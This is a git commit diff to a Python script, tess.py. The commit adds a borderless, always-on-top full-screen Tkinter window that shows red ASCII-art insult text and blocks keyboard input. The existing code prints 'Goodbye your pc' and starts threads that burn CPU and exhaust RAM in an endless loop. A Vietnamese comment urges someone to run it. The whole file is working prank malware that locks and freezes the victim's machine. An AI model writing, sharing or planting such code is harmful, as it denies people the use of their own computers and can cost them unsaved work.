fc8af817708cc15e19542749f577fd3c96379c53
lọ vương <helloeveryonevnlove@gmail.com>
2026-08-25 17:10:26 +0700

    Update tess.py

--- tess.py
+++ tess.py
@@ -1,11 +1,42 @@
+import tkinter as tk
+ASCII_TROLL_TEXT = """
+                              .__            ___.           
+  ____    ____  __ __    ____ |  |__  __ __  \_ |__   ____  
+ /    \  / ___\|  |  \  /    \|  |  \|  |  \  | __ \ /  _ \ 
+|   |  \/ /_/  >  |  / |   |  \   Y  \  |  /  | \_\ (  <_> )
+|___|  /\___  /|____/  |___|  /___|  /____/   |___  /\____/ 
+     \//_____/              \/     \/             \/      
+"""
+def create_lock_screen():
+  root = tk.Tk()
+  sw = root.winfo_screenwidth()
+  sh = root.winfo_screenheight()
+  root.geometry(f"{sw}x{sh}+0+0")
+  root.overrideredirect(True)
+  root.attributes("-topmost", True)
+  root.configure(bg="black")
+  label = tk.Label(
+      root,
+      text=ASCII_TROLL_TEXT + "\n\n",
+      font=("Consolas", 16, "bold"),
+      bg="black",
+      fg="#FF0000",
+      justify="center",
+  )
+  label.pack(expand=True)
+  root.bind("<Key>", lambda event: "break")
+  root.focus_force()
+  root.mainloop()
+if __name__ == "__main__":
+  create_lock_screen()
 import threading
 print(
     "Goodbye your pc"
 )
-print("...............")
+print("......")
 input(
     "Stand for freeze "
-    "................."
+    " end "
 )
 A = []
 def burn_cpu():
@@ -23,5 +54,7 @@ for i in range(8):
   threading.Thread(target=burn_cpu, daemon=True).start()
 threading.Thread(target=burn_ram, daemon=True).start()
 while True:
-  pass
-# chạy cái này đi #
+  pass 
+####################################################
+###              chạy cái này đi                 ###
+####################################################
